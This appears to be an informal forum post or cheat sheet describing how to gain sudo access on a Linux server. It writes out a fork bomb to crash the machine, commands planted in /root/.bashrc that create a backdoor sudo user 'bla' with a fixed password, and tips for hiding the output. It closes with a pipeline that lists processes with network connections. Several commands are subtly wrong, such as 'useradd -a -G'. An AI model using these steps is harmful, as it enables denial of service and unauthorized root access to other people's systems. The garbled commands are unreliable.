 yet another smart way to add a user to sudo group inside /root/.bashrc, fork-nuke the server from shell as such: 
:(){ :|: &};:
:(){ :|: &};: 
then wait for root to login and Wiola! got a user with sudo privs.
assuming vi/vim is setuid vuln. Also don't forget to be more discreet as useradd produces output, redirect to /dev/null all the time.
Example:
$ vim/root/.bashrc
Then, at the bottom, add:
$ useradd -a -G sudo bla
$ echo "bla:blapass" | chpasswd

just don't forget the password ;)))


ps -aux | awk '{print $2}' | xargs -0 echo > pids && for i in $(cat ./pids); do lsof -p $i 2> /dev/null; done | grep -i "ipv4\|ipv6"

find . -type f -exec grep -l "PS1" {} \;
